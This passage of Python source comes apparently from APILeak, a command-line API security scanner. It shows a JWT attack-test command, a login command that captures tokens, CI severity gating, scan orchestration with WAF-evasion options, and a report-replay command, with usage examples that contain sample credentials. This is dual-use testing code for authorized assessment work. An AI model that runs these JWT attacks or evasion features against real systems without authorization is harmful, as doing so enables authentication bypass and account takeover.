      python apileaks.py jwt attack-test eyJ0eXAiOiJKV1Q... --url https://api.example.com/user/profile

      # Test with custom authentication header
      python apileaks.py jwt attack-test TOKEN -u https://api.example.com/admin -H "X-API-Key: secret123"

      # Test POST endpoint with request body
      python apileaks.py jwt attack-test TOKEN -u https://api.example.com/update -d '{"name": "test"}'

    \b
    Advanced Usage Examples:
      # Multiple custom headers with extended timeout
      python apileaks.py jwt attack-test TOKEN -u URL \\
        -H "Authorization: Bearer backup-token" \\
        -H "X-Forwarded-For: 127.0.0.1" \\
        -H "User-Agent: Mobile-App/1.0" \\
        --timeout 60

      # Testing against development server with self-signed certificate
      python apileaks.py jwt attack-test TOKEN -u https://dev-api.local/protected \\
        --no-ssl-verify --max-retries 5

      # Complex POST request with JSON payload
      python apileaks.py jwt attack-test TOKEN -u https://api.example.com/transactions \\
        -d '{"amount": 100, "currency": "USD", "recipient": "user123"}' \\
        -H "Content-Type: application/json"

    \b
    Output and Results:
    • Real-time progress display with attack status
    • Detailed vulnerability findings with severity levels
    • Evidence and exploitation steps for successful attacks
    • Files saved to 'jwtattack/[session-id]/' directory:
      - tokens/: Generated attack tokens (*.jwt files)
      - responses/: HTTP response details (*.json files)
      - reports/: Human-readable and machine-parseable reports
      - baseline_response.json: Original token response for comparison

    \b
    Exit Codes:
      0    No vulnerabilities found or low/medium severity only
      1    High severity vulnerabilities detected
      2    Critical vulnerabilities detected
      130  Interrupted by user (Ctrl+C)

    \b
    Security Notes:
    • Only test against systems you own or have explicit permission to test
    • This tool generates multiple HTTP requests - be mindful of rate limits
    • Some attacks may trigger security monitoring - ensure proper authorization
    • Results should be verified manually before reporting as vulnerabilities

    \b
    Integration with Existing JWT Commands:
    • Uses same JWT utilities as other jwt subcommands for consistency
    • Leverages existing attack logic from test-alg-none, brute-secret, etc.
    • Compatible with tokens generated by 'jwt encode' command
    • Output format consistent with other APILeak reporting
    """
    try:
        # ------------------------------------------------------------------
        # Resolve new-option inputs BEFORE any request is issued (Reqs 63.6,
        # 67.1, 67.2). Each source is consumed up-front so an unreadable
        # Vector_File or an unparseable/token-less Raw_Request_Input aborts the
        # command with a descriptive error naming the offending file, and no
        # HTTP request is ever attempted.
        #
        # When no new option is supplied the token/url/headers/data resolve to
        # exactly the pre-existing single-token behavior (Req 67.5).
        # ------------------------------------------------------------------
        raw_parsed = None
        if raw_request:
            try:
                raw_parsed = parse_raw_request(raw_request)
            except ValueError as e:
                click.echo(f"❌ {e}", err=True)
                sys.exit(1)
            # The parsed request supplies the JWT and the request context.
            token = raw_parsed.token
            if not url:
                url = raw_parsed.url
            if not data:
                data = raw_parsed.body

        # A token must come from either the positional argument or the raw
        # request file.
        if not token:
            click.echo(
                "❌ No JWT token supplied. Provide TOKEN or --raw-request FILE.",
                err=True)
            sys.exit(1)

        # A live target is required for attack execution (preserved from the
        # original --url requirement); it may originate from --url or the raw
        # request file.
        if not url:
            click.echo(
                "❌ No target URL supplied. Provide --url or a --raw-request "
                "file with a Host header.",
                err=True)
            sys.exit(1)

        # Read the Vector_File up-front so an unreadable file aborts before any
        # request, naming the file (Req 63.6). Fuzzing needs both a target name
        # and a value file; requiring them together avoids a silently inert
        # option.
        fuzz_values = None
        if vector_file and not fuzz_target:
            click.echo(
                "❌ --vector-file requires --fuzz-target naming the claim or "
                "header to fuzz.",
                err=True)
            sys.exit(1)
        if fuzz_target and not vector_file:
            click.echo(
                "❌ --fuzz-target requires --vector-file supplying the fuzz "
                "values.",
                err=True)
            sys.exit(1)
        if vector_file:
            try:
                fuzz_values = read_vector_file(vector_file)
            except ValueError as e:
                click.echo(f"❌ {e}", err=True)
                sys.exit(1)

        # Validate JWT token first
        try:
            decoded_token = decode_jwt(token)
            click.echo("🔍 JWT Token Analysis")
            click.echo("="*50)
            click.echo(f"Algorithm: {decoded_token['header'].get('alg', 'Unknown')}")
            click.echo(f"Token Type: {decoded_token['header'].get('typ', 'Unknown')}")
            if 'sub' in decoded_token['payload']:
                click.echo(f"Subject: {decoded_token['payload']['sub']}")
            if 'exp' in decoded_token['payload']:
                import datetime
                exp_time = datetime.datetime.fromtimestamp(decoded_token['payload']['exp'])
                click.echo(f"Expires: {exp_time.strftime('%Y-%m-%d %H:%M:%S UTC')}")
            click.echo("")
        except Exception as e:
            click.echo(f"❌ Invalid JWT token: {e}", err=True)
            sys.exit(1)

        # Parse custom headers. When a raw request file was supplied its parsed
        # headers seed the request context (Req 67.1); explicit -H options then
        # override on a per-name basis.
        custom_headers = {}
        if raw_parsed is not None:
            custom_headers.update(raw_parsed.headers)
        for h in header:
            if ':' not in h:
                click.echo(f"❌ Invalid header format: {h}. Use 'Name: Value' format.", err=True)
                sys.exit(1)
            name, value = h.split(':', 1)
            custom_headers[name.strip()] = value.strip()

        # Display attack configuration
        click.echo("🎯 Attack Configuration")
        click.echo("="*50)
        click.echo(f"Target URL: {url}")
        if custom_headers:
            click.echo("Custom Headers:")
            for name, value in custom_headers.items():
                # Mask sensitive headers for display
                if name.lower() in ['authorization', 'cookie', 'x-api-key']:
                    masked_value = value[:10] + "..." if len(value) > 10 else "***"
                    click.echo(f"  {name}: {masked_value}")
                else:
                    click.echo(f"  {name}: {value}")
        if data:
            click.echo(f"POST Data: {data[:100]}{'...' if len(data) > 100 else ''}")
        click.echo(f"Timeout: {timeout}s")
        click.echo(f"SSL Verification: {'Disabled' if no_ssl_verify else 'Enabled'}")
        click.echo(f"Max Retries: {max_retries}")
        if raw_request:
            click.echo(f"Raw Request File: {raw_request}")
        if fuzz_target:
            click.echo(f"Fuzz Target: {fuzz_target} "
                       f"({len(fuzz_values or [])} value(s) from {vector_file})")
        if canary:
            click.echo("Canary: (supplied — corroborates analyzer success)")
        click.echo("")

        # Route all attack-token generation and execution through the single-
        # source-of-truth JWTAttackEngine (Requirements 14.2, 14.3), issuing HTTP
        # through the shared HTTPRequestEngine (Requirement 17.1). Success is
        # decided by the engine's response analyzer, not keyword presence
        # (Requirements 19.1, 19.2).
        from core.config import RateLimitConfig
        from utils.http_client import HTTPRequestEngine, RateLimiter, RetryConfig

        async def run_attack_test():
            rate_limiter = RateLimiter(RateLimitConfig())
            retry_config = RetryConfig(max_attempts=max_retries)
            http_engine = HTTPRequestEngine(
                rate_limiter, retry_config, timeout=timeout,
                verify_ssl=not no_ssl_verify)
            try:
                engine = _make_jwt_engine(
                    token, url, custom_headers, data, http_engine=http_engine,
                    fuzz_target=fuzz_target, fuzz_values=fuzz_values,
                    canary_value=canary)

                click.echo("🚀 Starting JWT Attack Testing...")
                click.echo("="*50)

                attack_summary = await engine.execute_all()
            finally:
                await http_engine.close()

            # Display results summary
            click.echo("\n" + "="*60)
            click.echo("JWT Attack Testing Results")
            click.echo("="*60)

            session = attack_summary.session
            click.echo(f"Session ID: {session.session_id}")
            click.echo(f"Duration: {session.duration:.2f}s" if session.duration else "Duration: N/A")
            click.echo(f"Total Attacks: {session.total_attacks}")
            click.echo(f"Successful Attacks: {session.successful_attacks}")
            click.echo(f"Success Rate: {session.success_rate:.1f}%")

            # Show vulnerability summary (analyzer-based, Req 19.1/19.3)
            if attack_summary.vulnerabilities_found:
                click.echo(f"\n🚨 VULNERABILITIES FOUND: {len(attack_summary.vulnerabilities_found)}")
                for vuln in attack_summary.vulnerabilities_found:
                    severity_icon = "🔴" if vuln.vulnerability_assessment.severity.value == "Critical" else "🟠" if vuln.vulnerability_assessment.severity.value == "High" else "🟡"
                    click.echo(f"  {severity_icon} {vuln.attack_type.value}: {vuln.vulnerability_assessment.vulnerability_type} ({vuln.vulnerability_assessment.severity.value}, confidence {vuln.vulnerability_assessment.confidence_score:.2f})")

            if attack_summary.potential_vulnerabilities:
                click.echo(f"\n⚠️  POTENTIAL VULNERABILITIES: {len(attack_summary.potential_vulnerabilities)}")
                for vuln in attack_summary.potential_vulnerabilities:
                    click.echo(f"  🟡 {vuln.attack_type.value}: {vuln.vulnerability_assessment.vulnerability_type} (Confidence: {vuln.vulnerability_assessment.confidence_score:.2f})")

            if not attack_summary.vulnerabilities_found and not attack_summary.potential_vulnerabilities:
                click.echo("\n✅ No vulnerabilities detected")

            # Exit with appropriate code based on findings
            if attack_summary.has_critical_findings:
                click.echo("\n🔴 Exiting with code 2 due to critical vulnerabilities")
                sys.exit(2)
            elif attack_summary.has_high_findings:
                click.echo("\n🟠 Exiting with code 1 due to high severity vulnerabilities")
                sys.exit(1)
            else:
                click.echo("\n✅ Attack testing completed successfully")
                sys.exit(0)

        # Run the async attack test
        asyncio.run(run_attack_test())

    except KeyboardInterrupt:
        click.echo("\n❌ Attack testing interrupted by user")
        sys.exit(130)
    except Exception as e:
        click.echo(f"\n❌ Attack testing failed: {e}", err=True)
        sys.exit(1)


@jwt.command('login')
@click.option('--url', '-u', required=True,
              help='Login endpoint URL (e.g. http://HOST/api/v1.0/login)')
@click.option('--body', '-d', default='{}',
              help='JSON body with credentials (default: {}). '
                   'Example: \'{"username":"user","password":"pass"}\'')
@click.option('--method', '-X', default='POST',
              type=click.Choice(['POST', 'GET', 'PUT'], case_sensitive=False),
              help='HTTP method (default: POST)')
@click.option('--header', '-H', multiple=True,
              help='Extra headers (format: "Name: Value"). Repeatable.')
@click.option('--token-field', default=None,
              help='JSON field name that contains the token in the response. '
                   'If omitted, the command searches common field names '
                   '(token, access_token, jwt, id_token, accessToken).')
@click.option('--save', type=click.Path(), default=None,
              help='Save the captured token to this file path. '
                   'Example: --save /tmp/token.jwt')
@click.option('--no-ssl-verify', is_flag=True,
              help='Disable SSL certificate verification.')
@click.option('--timeout', default=30, show_default=True,
              help='Request timeout in seconds.')
@click.pass_context
def jwt_login(ctx, url, body, method, header, token_field, save, no_ssl_verify, timeout):
    """POST credentials to a login endpoint and capture the returned JWT.

    The captured token is printed to stdout so it can be piped directly into
    other jwt subcommands, and optionally saved to a file with --save.

    \b
    Examples:
      # Basic login, token printed to terminal
      python apileaks.py jwt login \\
          --url http://MACHINEIP/api/v1.0/example2 \\
          --body '{"username":"user","password":"password2"}'

      # Save token to file, then use it for attack testing
      python apileaks.py jwt login \\
          --url http://HOST/api/v1.0/login \\
          --body '{"username":"admin","password":"admin123"}' \\
          --save /tmp/captured.jwt

      python apileaks.py jwt attack-test $(cat /tmp/captured.jwt) \\
          --url http://HOST/api/v1.0/protected

      # Custom token field name
      python apileaks.py jwt login \\
          --url http://HOST/auth \\
          --body '{"user":"bob","pass":"secret"}' \\
          --token-field auth_token
    """
    import httpx

    # Parse body
    try:
        body_dict = json.loads(body)
    except json.JSONDecodeError as exc:
        click.echo(f"❌ --body is not valid JSON: {exc}", err=True)
        sys.exit(1)

    # Parse headers
    request_headers = {'Content-Type': 'application/json'}
    for h in header:
        if ':' not in h:
            click.echo(f"❌ Invalid header format: {h!r}. Use 'Name: Value'.", err=True)
            sys.exit(1)
        name, value = h.split(':', 1)
        request_headers[name.strip()] = value.strip()

    # Common field names to search when --token-field is not specified
    _COMMON_FIELDS = ['token', 'access_token', 'jwt', 'id_token', 'accessToken',
                      'auth_token', 'bearer', 'Authorization']

    click.echo(f"🔐 Sending {method.upper()} to {url} ...")

    try:
        with httpx.Client(verify=not no_ssl_verify, timeout=timeout) as client:
            response = client.request(
                method.upper(),
                url,
                json=body_dict,
                headers=request_headers,
            )

        click.echo(f"   Status: {response.status_code}")

        # Try to parse JSON response
        try:
            data = response.json()
        except Exception:
            click.echo("❌ Response is not JSON. Raw body:", err=True)
            click.echo(response.text, err=True)
            sys.exit(1)

        # Locate the token
        captured_token = None
        found_field = None

        if token_field:
            # Explicit field name
            if token_field in data:
                captured_token = data[token_field]
                found_field = token_field
            else:
                click.echo(
                    f"❌ Field '{token_field}' not found in response. "
                    f"Available keys: {list(data.keys())}", err=True)
                sys.exit(1)
        else:
            # Auto-detect
            for field in _COMMON_FIELDS:
                if field in data and isinstance(data[field], str) and data[field].strip():
                    captured_token = data[field].strip()
                    found_field = field
                    break

        if not captured_token:
            click.echo(
                "❌ Could not locate a JWT in the response. "
                "Use --token-field to specify the field name.\n"
                f"Response keys: {list(data.keys())}", err=True)
            sys.exit(1)

        # Strip "Bearer " prefix if present
        if captured_token.lower().startswith('bearer '):
            captured_token = captured_token[7:].strip()

        click.echo(f"\n✅ Token captured from field: '{found_field}'")
        click.echo("─" * 60)
        click.echo(captured_token)
        click.echo("─" * 60)

        # Decode and display summary
        try:
            decoded = decode_jwt(captured_token)
            alg = decoded['header'].get('alg', '?')
            sub = decoded['payload'].get('sub') or decoded['payload'].get('user') or '—'
            exp = decoded['payload'].get('exp')
            exp_str = ''
            if exp:
                import datetime
                exp_str = f"  exp: {datetime.datetime.fromtimestamp(exp).strftime('%Y-%m-%d %H:%M:%S')}"
            click.echo(f"   alg={alg}  sub={sub}{exp_str}")
        except Exception:
            pass  # Non-critical — still output the raw token

        # Save to file if requested
        if save:
            save_path = Path(save)
            save_path.parent.mkdir(parents=True, exist_ok=True)
            save_path.write_text(captured_token, encoding='utf-8')
            click.echo(f"\n💾 Token saved to: {save_path}")
            click.echo(f"   Use with: python apileaks.py jwt decode $(cat {save_path})")

    except httpx.ConnectError as exc:
        click.echo(f"❌ Connection failed: {exc}", err=True)
        sys.exit(1)
    except httpx.TimeoutException:
        click.echo(f"❌ Request timed out after {timeout}s.", err=True)
        sys.exit(1)
    except Exception as exc:
        click.echo(f"❌ Unexpected error: {exc}", err=True)
        sys.exit(1)



@cli.command(hidden=True)
@click.option('--config', '-c', type=click.Path(exists=True),
              help='Configuration file path (YAML or JSON) - optional')
@click.option('--target', '-t', help='Target URL to scan (overrides config)')
@click.option('--output', '-o', default='reports', help='Output directory for reports')
@click.option('--log-level', type=click.Choice(['DEBUG', 'INFO', 'WARNING', 'ERROR']),
              default='WARNING', help='Logging level')
@click.option('--log-file', help='Log file path (optional)')
@click.option('--json-logs', is_flag=True, help='Output logs in JSON format')
@click.option('--modules', help='Comma-separated list of OWASP modules to enable')
@click.option('--rate-limit', type=int, help='Requests per second limit')
@click.pass_context
def main(ctx, config, target, output, log_level, log_file, json_logs, modules, rate_limit):
    """Legacy main command - redirects to scan (deprecated)"""
    _emit_deprecation_notice('main', 'scan')
    # Forward the parsed options to ``scan`` so the run and exit code are
    # identical to the non-deprecated invocation; Click fills defaults for
    # ``scan`` options not present on ``main`` (Requirements 6.3, 6.7).
    ctx.forward(scan)


# Severity ladder for CI/CD gate evaluation, ordered from highest to lowest.
SEVERITY_LADDER = ["critical", "high", "medium", "low"]


def _count_by_severity(findings):
    """Count findings by severity name for the CI severity gate.

    Args:
        findings: Iterable of Finding objects.

    Returns:
        A mapping of ``{"critical": int, "high": int, "medium": int, "low": int}``.
    """
    counts = {"critical": 0, "high": 0, "medium": 0, "low": 0}
    for finding in findings:
        severity = getattr(finding, 'severity', None)
        name = getattr(severity, 'value', severity)
        if isinstance(name, str):
            name = name.lower()
        if name in counts:
            counts[name] += 1
    return counts


def evaluate_severity_gate(counts, fail_on):
    """
    Deterministically map finding counts and a fail-on threshold to a CI exit code.

    This is a pure function (no I/O, no side effects) so the CI severity-gate
    behavior is deterministic and independently testable.

    Args:
        counts: Mapping of severity name -> count, e.g.
                ``{"critical": 1, "high": 0, "medium": 2, "low": 0}``.
                Missing keys are treated as zero.
        fail_on: Severity threshold, one of "critical", "high", "medium", "low".
                 Unknown/empty values fall back to the strictest threshold
                 ("critical").

    Returns:
        2 if at least one critical finding is present and the highest finding
          present meets or exceeds the threshold (Requirement 9.2),
        1 if the highest finding present meets or exceeds the threshold but no
          critical finding is present,
        0 if the highest finding present is below the threshold, or there are
          no findings at all (Requirement 9.3).
    """
    fail_on = (fail_on or "critical").lower()
    if fail_on not in SEVERITY_LADDER:
        fail_on = "critical"

    threshold_rank = SEVERITY_LADDER.index(fail_on)  # 0 = critical (strictest)

    # Highest severity actually present is the lowest index in the ladder.
    highest_present_rank = None
    for rank, severity in enumerate(SEVERITY_LADDER):
        if counts.get(severity, 0) > 0:
            highest_present_rank = rank
            break

    # No findings present -> pass.
    if highest_present_rank is None:
        return 0

    # Highest present severity is below the threshold -> pass (Requirement 9.3).
    if highest_present_rank > threshold_rank:
        return 0

    # Threshold met or exceeded: critical present -> 2 (Requirement 9.2), else 1.
    if counts.get("critical", 0) > 0:
        return 2
    return 1


async def run_enhanced_apileak(config, ci_mode=False, fail_on="critical", baseline=None, discovery_progress=None, scope_endpoints=None, checkpoint_path=None, resume_checkpoint=None):
    """
    Run enhanced APILeak scan with full integration of all components

    Args:
        config: APILeak configuration
        ci_mode: Whether running in CI/CD mode
        fail_on: Severity level to fail on in CI mode
        baseline: Optional path to a baseline JSON report. When provided,
                  findings are classified into new vs known and the CI severity
                  gate evaluates only the New_Finding set (Requirements 11.1-11.5).
        discovery_progress: Optional live Progress_Display (Requirement 32). When
                  provided it is attached to the core so the endpoint fuzzer
                  renders live discovery progress; otherwise discovery runs
                  without a display.
        scope_endpoints: Optional pre-selected discovered records
                  (``DiscoveryResult`` objects) defining a Batch_Scan_Scope.
                  When non-empty, the set is threaded into
                  ``APILeakCore.run_scan(scope_endpoints=...)`` which seeds the
                  discovery phase directly so the OWASP modules consume exactly
                  the seeded endpoints, skipping wordlist discovery
                  (Requirements 36.3, 36.8).
    """
    logger = get_logger("run_enhanced_apileak")

    # Initialize APILeak Core with enhanced orchestration
    core = APILeakCore(config)

    # Attach the live Progress_Display (if any) before discovery runs so the
    # endpoint fuzzer can render it (Requirement 32). No-op/disabled instances
    # are harmless.
    if discovery_progress is not None:
        core.discovery_progress = discovery_progress

    # Attach the resume/checkpoint state (Requirement 37) before discovery runs.
    # ``checkpoint_path`` enables periodic checkpoint writes; ``resume_checkpoint``
    # is a pre-loaded DiscoveryCheckpoint used to seed the fuzzer before discovery
    # so already-tested candidates are skipped and results merge. Both are None by
    # default, leaving discovery unchanged.
    if checkpoint_path is not None:
        core.discovery_checkpoint_path = checkpoint_path
    if resume_checkpoint is not None:
        core.discovery_resume_checkpoint = resume_checkpoint

    # Perform health check
    health_status = await core.health_check()
    if health_status["status"] != "healthy":
        logger.warning("Health check indicates issues", status=health_status)

    # Run the enhanced scan with intelligent orchestration
    target_url = config.target.base_url
    logger.info("Starting enhanced APILeak scan", target=target_url, ci_mode=ci_mode)

    # Show enhanced scan configuration
    click.echo(f"\n🎯 Target: {target_url}")

    # Display enabled advanced features
    advanced_features = []
    if hasattr(config.advanced_discovery, 'framework_detection') and config.advanced_discovery.framework_detection.get('enabled'):
        advanced_features.append("Framework Detection")
    if hasattr(config.advanced_discovery, 'version_fuzzing') and config.advanced_discovery.version_fuzzing.get('enabled'):
        advanced_features.append("Version Fuzzing")
    if hasattr(config.advanced_discovery, 'payload_encoding') and config.advanced_discovery.payload_encoding.get('enabled'):
        advanced_features.append("Payload Encoding")
    if hasattr(config.advanced_discovery, 'waf_detection') and config.advanced_discovery.waf_detection.get('enabled'):
        advanced_features.append("WAF Evasion")
    if config.advanced_discovery.subdomain_discovery:
        advanced_features.append("Subdomain Discovery")
    if config.advanced_discovery.cors_analysis:
        advanced_features.append("CORS Analysis")

    if advanced_features:
        click.echo(f"🚀 Advanced Features: {', '.join(advanced_features)}")

    # Display OWASP modules
    if config.owasp_testing.enabled_modules:
        click.echo(f"🛡️  OWASP Modules: {', '.join(config.owasp_testing.enabled_modules)}")

    if hasattr(config.fuzzing, 'response_filter') and config.fuzzing.response_filter:
        click.echo(f"📊 Response Filter: {config.fuzzing.response_filter}")
    if hasattr(config, 'http_output') and config.http_output.status_code_filter:
        click.echo(f"🎨 Status Code Filter: {config.http_output.status_code_filter}")
    if config.authentication.contexts[0].token:
        click.echo("🔐 Authentication: JWT Token provided")
    if hasattr(config.fuzzing.headers, 'random_user_agent') and config.fuzzing.headers.random_user_agent:
        click.echo("🎭 WAF Evasion: Random User-Agent enabled")

    click.echo(f"⚡ Rate Limit: {config.rate_limiting.requests_per_second} req/sec")

    if getattr(config, 'safe_mode', False):
        click.echo("🛟 Safe Mode: Enabled (state-changing probes skipped, safe methods only)")

    if ci_mode:
        click.echo(f"🔄 CI/CD Mode: Enabled (fail on {fail_on}+ severity)")

    click.echo("")

    try:
        # Execute the enhanced scan with intelligent orchestration
        results = await core.run_scan(target_url, scope_endpoints=scope_endpoints)

        # Generate enhanced reports with all findings
        from utils.report_generator import ReportGenerator

        report_generator = ReportGenerator()

        # Determine scan type for report naming
        scan_type = "full"
        if config.fuzzing.endpoints.enabled and not config.fuzzing.parameters.enabled:
            scan_type = "dir"
        elif config.fuzzing.parameters.enabled and not config.fuzzing.endpoints.enabled:
            scan_type = "param"

        # Generate reports with custom names
        output_filename = getattr(config.reporting, 'output_filename', None)
        report_files = report_generator.save_reports(results, config.reporting.output_dir, scan_type, output_filename, formats=getattr(config.reporting, 'formats', None))

        # Display enhanced summary with advanced features results
        click.echo("\n" + "="*60)
        click.echo("APILeak Enhanced Scan Completed Successfully")
        click.echo("="*60)
        click.echo(f"Target: {target_url}")
        click.echo(f"Scan ID: {results.scan_id}")
        click.echo(f"Duration: {results.performance_metrics.duration}")

        # Surface discovery recursion-control status (budget reached / catch-all
        # detected) so the operator sees when discovery was truncated or wildcard
        # responses were excluded (Requirements 18.5, 19.5).
        _echo_discovery_control_status(core)

        # Get enhanced statistics from findings collector
        if hasattr(results, 'findings_collector') and results.findings_collector:
            stats = results.findings_collector.get_statistics()
            owasp_coverage = results.findings_collector.get_owasp_coverage()

            # Show advanced discovery results if available
            if hasattr(results, 'advanced_results'):
                advanced_results = results.advanced_results
                if hasattr(advanced_results, 'framework_detected') and advanced_results.framework_detected:
                    click.echo(f"🔍 Framework Detected: {advanced_results.framework_detected.name} (confidence: {advanced_results.framework_detected.confidence:.2f})")
                if hasattr(advanced_results, 'api_versions_found') and advanced_results.api_versions_found:
                    click.echo(f"📋 API Versions Found: {len(advanced_results.api_versions_found)}")
                if hasattr(advanced_results, 'subdomains_discovered') and advanced_results.subdomains_discovered:
                    click.echo(f"🌐 Subdomains Discovered: {len(advanced_results.subdomains_discovered)}")
                if hasattr(advanced_results, 'waf_detected') and advanced_results.waf_detected:
                    click.echo(f"🛡️  WAF Detected: {advanced_results.waf_detected.name} (confidence: {advanced_results.waf_detected.confidence:.2f})")

            # Show scan-specific metrics
            if scan_type == "dir":
                endpoints_tested = getattr(results.statistics, 'endpoints_tested', 0)
                click.echo(f"Total Endpoints Tested: {endpoints_tested}")
                if hasattr(results, 'discovered_endpoints'):
                    valid_endpoints = [e for e in core.get_discovered_endpoints() if hasattr(e, 'status_code') and e.status_code in [200, 201, 202, 204]]
                    if valid_endpoints:
                        click.echo("📍 Endpoints Found:")
                        for endpoint in valid_endpoints[:10]:  # Show first 10
                            click.echo(f"  - {endpoint.method} {endpoint.url} ({endpoint.status_code})")
                        if len(valid_endpoints) > 10:
                            click.echo(f"  ... and {len(valid_endpoints) - 10} more")
                    else:
                        click.echo("No valid endpoints found (all returned 404 or errors)")
            elif scan_type == "param":
                click.echo(f"Total Parameters Tested: {getattr(results.statistics, 'parameters_tested', 0)}")

            click.echo(f"Total Findings: {stats['total_findings']}")
            click.echo(f"Critical: {stats['critical_findings']}")
            click.echo(f"High: {stats['high_findings']}")
            click.echo(f"Medium: {stats['medium_findings']}")
            click.echo(f"Low: {stats['low_findings']}")
            click.echo(f"Info: {stats['info_findings']}")
            click.echo(f"OWASP Coverage: {owasp_coverage['coverage_percentage']:.1f}% ({owasp_coverage['tested_categories']}/{owasp_coverage['total_categories']} categories)")

            # Show most critical category if any
            if stats.get('most_critical_category'):
                click.echo(f"Most Critical Category: {stats['most_critical_category']}")
        else:
            # Fallback to basic statistics
            click.echo(f"Total Findings: {results.statistics.findings_count}")
            click.echo(f"Critical: {results.statistics.critical_findings}")
            click.echo(f"High: {results.statistics.high_findings}")
            click.echo(f"Medium: {results.statistics.medium_findings}")
            click.echo(f"Low: {results.statistics.low_findings}")
            click.echo(f"Info: {results.statistics.info_findings}")

        click.echo("\nReports generated:")
        for report_file in report_files:
            click.echo(f"  - {report_file}")

        # Baseline comparison: classify findings into new vs known relative to a
        # baseline JSON report (Requirements 11.1-11.3). A missing baseline path
        # yields an empty baseline so every finding is treated as new (11.5).
        new_findings = None
        if baseline:
            from utils.baseline import BaselineComparator

            comparator = BaselineComparator()
            baseline_keys = comparator.load(baseline)

            if hasattr(results, 'findings_collector') and results.findings_collector:
                all_findings = results.findings_collector.get_prioritized_findings()
            else:
                all_findings = list(getattr(results, 'findings', []) or [])

            new_findings, known_findings = comparator.classify(all_findings, baseline_keys)

            click.echo("\n📊 Baseline Comparison:")
            click.echo(f"  - Baseline: {baseline}")
            click.echo(f"  - New findings: {len(new_findings)}")
            click.echo(f"  - Known findings: {len(known_findings)}")

        # Enhanced CI/CD integration with configurable exit codes
        if ci_mode:
            if new_findings is not None:
                # With a baseline, the severity gate evaluates only the
                # New_Finding set (Requirement 11.4).
                counts = _count_by_severity(new_findings)
            else:
                counts = {
                    "critical": getattr(results.statistics, 'critical_findings', 0),
                    "high": getattr(results.statistics, 'high_findings', 0),
                    "medium": getattr(results.statistics, 'medium_findings', 0),
                    "low": getattr(results.statistics, 'low_findings', 0),
                }

            # Deterministic exit code derived from the highest severity present
            # and the configured fail-on threshold (Requirements 9.1-9.3).
            exit_code = evaluate_severity_gate(counts, fail_on)

            if exit_code == 0:
                exit_reason = "No findings at or above the configured threshold"
            else:
                exit_reason = (
                    f"{counts['critical']} critical, {counts['high']} high, "
                    f"{counts['medium']} medium, {counts['low']} low findings "
                    f"(fail on {fail_on}+)"
                )

            click.echo(f"\n🔄 CI/CD Result: Exit code {exit_code} - {exit_reason}")

            logger.info("CI/CD scan completed", exit_code=exit_code, reason=exit_reason)
            sys.exit(exit_code)
        else:
            # Standard exit codes for non-CI mode
            critical_count = getattr(results.statistics, 'critical_findings', 0)
            high_count = getattr(results.statistics, 'high_findings', 0)

            if critical_count > 0:
                logger.info("Exiting with code 2 due to critical findings")
                sys.exit(2)
            elif high_count > 0:
                logger.info("Exiting with code 1 due to high severity findings")
                sys.exit(1)
            else:
                logger.info("Scan completed successfully with no critical/high findings")
                sys.exit(0)

    except Exception as e:
        logger.error("Enhanced scan execution failed", error=str(e))
        if ci_mode:
            click.echo(f"\n❌ CI/CD Scan Failed: {e}")
            sys.exit(3)  # Special exit code for scan failures in CI
        raise


async def run_apileak(config):
    """
    Run APILeak scan with the provided configuration (legacy compatibility)

    Args:
        config: APILeak configuration
    """
    # Delegate to enhanced version with default CI settings
    await run_enhanced_apileak(config, ci_mode=False, fail_on="critical")


# =============================================================================
# replay command
# =============================================================================

@cli.command(name="replay")
@click.argument("report", type=click.Path(exists=True, readable=True))
@click.option("--url", "-u", "url_filter", default=None,
              help="Filter: only replay requests whose URL contains this substring.")
@click.option("--method", "-m", "method_filter", default=None,
              help="Filter: only replay requests with this HTTP method (e.g. POST).")
@click.option("--source", "source_filter",
              type=click.Choice(["endpoint", "finding"], case_sensitive=False),
              default=None,
              help="Filter: only replay items from 'endpoint' or 'finding' sections.")
@click.option("--index", "-i", "index", type=int, default=None,
              help="Replay only the item at this index in the filtered list (0-based).")
@click.option("--list", "-l", "list_only", is_flag=True, default=False,
              help="List all replayable requests from the report without replaying.")
@click.option("--proxy", "proxy", default=None, metavar="URL",
              help="Forward the replayed request through an intercepting proxy "
                   "(e.g. http://127.0.0.1:8080 for Burp/Caido).")
@click.option("--jwt", "jwt_token", default=None, metavar="TOKEN",
              help="Bearer token to inject into the Authorization header.")
@click.option("--header", "-H", "header", multiple=True, metavar="Name: Value",
              help="Additional request header (repeatable, e.g. -H 'X-API-Key: abc').")
@click.option("--timeout", "timeout", type=float, default=30.0, show_default=True,
              help="Per-request timeout in seconds.")
@click.option("--no-verify", "no_verify", is_flag=True, default=False,
              help="Disable TLS certificate verification.")
@click.option("--all", "replay_all", is_flag=True, default=False,
              help="Replay ALL matching requests (default: only the first match).")
@click.pass_context
def replay_cmd(ctx, report, url_filter, method_filter, source_filter, index,
               list_only, proxy, jwt_token, header, timeout, no_verify, replay_all):
    """Replay HTTP requests from a prior apileaks scan report.

    REPORT is the path to a JSON report file generated by the ``dir``,
    ``par``, or ``scan`` commands.

    \b
    Examples:
      # List all replayable requests in a report
      apileaks replay reports/scan.json --list

      # Replay all POST findings through Burp
      apileaks replay reports/scan.json --source finding --method POST --proxy http://127.0.0.1:8080 --all

      # Replay item #3 from the list with a JWT
      apileaks replay reports/scan.json --index 3 --jwt eyJ...

      # Replay every endpoint containing '/admin'
      apileaks replay reports/scan.json --url /admin --all
    """
    import asyncio

    from utils.replay import (
        _extract_requests_from_report,
        filter_requests,
        load_report,
        print_request_list,
        replay_request,
    )

    no_banner = ctx.obj.get("no_banner", False) if ctx.obj else False
    if not no_banner:
        print_banner()

    # Load report
    rep = load_report(report)
    all_requests = _extract_requests_from_report(rep)

    if not all_requests:
        click.echo("No replayable requests found in this report.", err=True)
        sys.exit(1)

    # Apply filters
    filtered = filter_requests(
        all_requests,
        url_filter=url_filter,
        method_filter=method_filter,
        source_filter=source_filter,
        index=index,
    )

    if not filtered:
        click.echo(
            "No requests matched the supplied filters. "
            "Use --list to see what is available.",
            err=True,
        )
        sys.exit(1)

    # List mode: just print the table and exit
    if list_only:
        print_request_list(filtered)
        return

    # If not --all, replay only the first match (unless --index was supplied)
    targets = filtered if replay_all else [filtered[0]]

    if len(targets) > 1:
        click.echo(
            f"Replaying {len(targets)} request(s)…  "
            f"(pass --index N to target a specific one, or --list to browse)"
        )

    # Parse extra headers
    extra_headers = parse_header_options(header)
    validate_header_options(header)

    # Run replays
    for entry in targets:
        try:
            asyncio.run(
                replay_request(
                    entry,
                    extra_headers=extra_headers or None,
                    jwt_token=jwt_token,
                    proxy=proxy,
                    verify_ssl=not no_verify,
                    timeout=timeout,
                    verbose=True,
